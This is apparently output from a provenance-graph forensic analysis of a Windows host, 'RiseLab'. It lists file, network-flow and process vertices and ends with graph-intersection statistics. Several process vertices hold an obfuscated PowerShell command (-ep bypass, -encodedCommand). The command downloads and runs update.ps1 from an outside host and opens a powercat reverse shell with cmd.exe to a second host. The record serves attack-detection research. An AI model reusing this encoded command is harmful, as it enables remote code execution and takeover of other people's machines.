+Key: name, Value: \\Device\\HarddiskVolume2\\Users\\admin\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell
+Key: uuid, Value: 00BE1DA9-BF68-4714-8A44-79FABEE97019
+Vertex ID: 365391
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Users\\admin\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline
+Key: uuid, Value: F66A37C7-53A9-4FE5-A3BB-ECED7E2A58BD
+Vertex ID: 365392
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Users\\admin\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt
+Key: uuid, Value: A378E06D-09A0-44F2-8893-AB82767D62F6
+Vertex ID: 365393
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Users\\admin\\AppData\\Local\\Microsoft\\Windows\\PowerShell\\StartupProfileData-Interactive
+Key: uuid, Value: 79E217F7-5CE6-4340-A0DB-C5DF05AC9F21
+Vertex ID: 365394
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Users\\admin\\AppData\\Local\\Microsoft\\CLR_v4.0\\UsageLogs\\powershell.exe.log
+Key: uuid, Value: 70BDAF5C-125D-420D-8B22-2657C4D6F746
+Vertex ID: 365684
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Users\\admin\\AppData\\Local\\Temp\\__PSScriptPolicyTest_xi2heiat.ljl.psm1
+Key: uuid, Value: D8CC9027-4895-4175-BFAE-ACCC2FA17C35
+Vertex ID: 365686
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\ProgramData\\update.ps1
+Key: uuid, Value: 40989dd5-c389-4c76-8435-8b6074f19659
+Vertex ID: 365686
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\ProgramData\\update.ps1
+Key: uuid, Value: 40989dd5-c389-4c76-8435-8b6074f19659
+Vertex ID: 365687
+Key: srcip, Value: 128.55.12.67/32
+Key: hostname, Value: RiseLab
+Key: dstport, Value: 80
+Key: srcport, Value: 57619
+Key: dstip, Value: 208.75.117.5/32
+Key: uuid, Value: A2228FBE-118E-44C1-8D52-0A66D3CC12AC
+Vertex ID: 365688
+Key: hostname, Value: RiseLab
+Key: srcip, Value: 128.55.12.67/32
+Key: dstport, Value: 80
+Key: srcport, Value: 57620
+Key: dstip, Value: 208.75.117.6/32
+Key: uuid, Value: 7AD06BC2-3D95-45B2-8DCC-51171B5DDBA0
+Vertex ID: 365685
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Users\\admin\\AppData\\Local\\Temp\\__PSScriptPolicyTest_2kczjlv4.vlp.ps1
+Key: uuid, Value: B49F3A43-0176-4030-8D06-A4D7EDC08BA2
+Vertex ID: 365685
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Users\\admin\\AppData\\Local\\Temp\\__PSScriptPolicyTest_2kczjlv4.vlp.ps1
+Key: uuid, Value: B49F3A43-0176-4030-8D06-A4D7EDC08BA2
+Vertex ID: 365684
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Users\\admin\\AppData\\Local\\Temp\\__PSScriptPolicyTest_xi2heiat.ljl.psm1
+Key: uuid, Value: D8CC9027-4895-4175-BFAE-ACCC2FA17C35
+Vertex ID: 365687
+Key: srcip, Value: 128.55.12.67/32
+Key: hostname, Value: RiseLab
+Key: dstport, Value: 80
+Key: srcport, Value: 57619
+Key: dstip, Value: 208.75.117.5/32
+Key: uuid, Value: A2228FBE-118E-44C1-8D52-0A66D3CC12AC
+Vertex ID: 365688
+Key: hostname, Value: RiseLab
+Key: srcip, Value: 128.55.12.67/32
+Key: dstport, Value: 80
+Key: srcport, Value: 57620
+Key: dstip, Value: 208.75.117.6/32
+Key: uuid, Value: 7AD06BC2-3D95-45B2-8DCC-51171B5DDBA0
+Vertex ID: 368117
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: name, Value: \\Device\\HarddiskVolume2\\Users\\admin\\AppData\\Local\\Microsoft\\Windows\\PowerShell\\StartupProfileData-NonInteractive
+Key: uuid, Value: 61781528-104B-4FCF-9314-519E8E33677A
+Vertex ID: 365362
+Key: ownergroupid, Value:  
+Key: exename, Value: powershell
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: pid, Value: 8724
+Key: uuid, Value: DD97762B-4B23-4BB6-9199-BEB0C1D81A14
+Vertex ID: 365665
+Key: exename, Value: powershell  -nop -ep bypass -encodedCommand KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAGYAaQBsAGUAKAAnAGgAdAB0AHAAOgAvAC8AMgAwADgALgA3ADUALgAxADEANwAuADUALwB1AHAAZABhAHQAZQAuAHAAcwAxACcALAAgACcAQwA6AFwAcAByAG8AZwByAGEAbQBkAGEAdABhAFwAdQBwAGQAYQB0AGUALgBwAHMAMQAnACkAOwAgAC4AIABDADoAXABcAHAAcgBvAGcAcgBhAG0AZABhAHQAYQBcAFwAdQBwAGQAYQB0AGUALgBwAHMAMQA7ACAAcABvAHcAZQByAGMAYQB0ACAALQBjACAAMgAwADgALgA3ADUALgAxADEANwAuADYAIAAtAHAAIAA4ADAAIAAtAGUAIABjAG0AZAAuAGUAeABl
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: pid, Value: 7784
+Key: uuid, Value: 9ED8A6DD-4421-49EF-952C-95345205919B
+Vertex ID: 365665
+Key: exename, Value: powershell  -nop -ep bypass -encodedCommand KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAGYAaQBsAGUAKAAnAGgAdAB0AHAAOgAvAC8AMgAwADgALgA3ADUALgAxADEANwAuADUALwB1AHAAZABhAHQAZQAuAHAAcwAxACcALAAgACcAQwA6AFwAcAByAG8AZwByAGEAbQBkAGEAdABhAFwAdQBwAGQAYQB0AGUALgBwAHMAMQAnACkAOwAgAC4AIABDADoAXABcAHAAcgBvAGcAcgBhAG0AZABhAHQAYQBcAFwAdQBwAGQAYQB0AGUALgBwAHMAMQA7ACAAcABvAHcAZQByAGMAYQB0ACAALQBjACAAMgAwADgALgA3ADUALgAxADEANwAuADYAIAAtAHAAIAA4ADAAIAAtAGUAIABjAG0AZAAuAGUAeABl
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: pid, Value: 7784
+Key: uuid, Value: 9ED8A6DD-4421-49EF-952C-95345205919B
+Vertex ID: 365665
+Key: ownergroupid, Value:  
+Key: exename, Value: powershell  -nop -ep bypass -encodedCommand KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAGYAaQBsAGUAKAAnAGgAdAB0AHAAOgAvAC8AMgAwADgALgA3ADUALgAxADEANwAuADUALwB1AHAAZABhAHQAZQAuAHAAcwAxACcALAAgACcAQwA6AFwAcAByAG8AZwByAGEAbQBkAGEAdABhAFwAdQBwAGQAYQB0AGUALgBwAHMAMQAnACkAOwAgAC4AIABDADoAXABcAHAAcgBvAGcAcgBhAG0AZABhAHQAYQBcAFwAdQBwAGQAYQB0AGUALgBwAHMAMQA7ACAAcABvAHcAZQByAGMAYQB0ACAALQBjACAAMgAwADgALgA3ADUALgAxADEANwAuADYAIAAtAHAAIAA4ADAAIAAtAGUAIABjAG0AZAAuAGUAeABl
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: pid, Value: 7784
+Key: uuid, Value: 9ED8A6DD-4421-49EF-952C-95345205919B
+Vertex ID: 365665
+Key: exename, Value: powershell  -nop -ep bypass -encodedCommand KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAGYAaQBsAGUAKAAnAGgAdAB0AHAAOgAvAC8AMgAwADgALgA3ADUALgAxADEANwAuADUALwB1AHAAZABhAHQAZQAuAHAAcwAxACcALAAgACcAQwA6AFwAcAByAG8AZwByAGEAbQBkAGEAdABhAFwAdQBwAGQAYQB0AGUALgBwAHMAMQAnACkAOwAgAC4AIABDADoAXABcAHAAcgBvAGcAcgBhAG0AZABhAHQAYQBcAFwAdQBwAGQAYQB0AGUALgBwAHMAMQA7ACAAcABvAHcAZQByAGMAYQB0ACAALQBjACAAMgAwADgALgA3ADUALgAxADEANwAuADYAIAAtAHAAIAA4ADAAIAAtAGUAIABjAG0AZAAuAGUAeABl
+Key: ownergroupid, Value:  
+Key: hostname, Value: RiseLab
+Key: owneruserid, Value:  
+Key: pid, Value: 7784
+Key: uuid, Value: 9ED8A6DD-4421-49EF-952C-95345205919B
+- internalJg vertices:16, edges:30
+- jg vertices:9, edges:17; internalJg vertices:16, edges:30
+
++ jg vertices:18, edges:32
+
+createIntersectJg-jg1: 251 vertices and 319 edges. jg2(union forward graphs generated by entry nodes): 18 vertices and 32 edges.
+jgIntersect has: 7 vertices and 14 edges.
+Executed in 31 seconds.
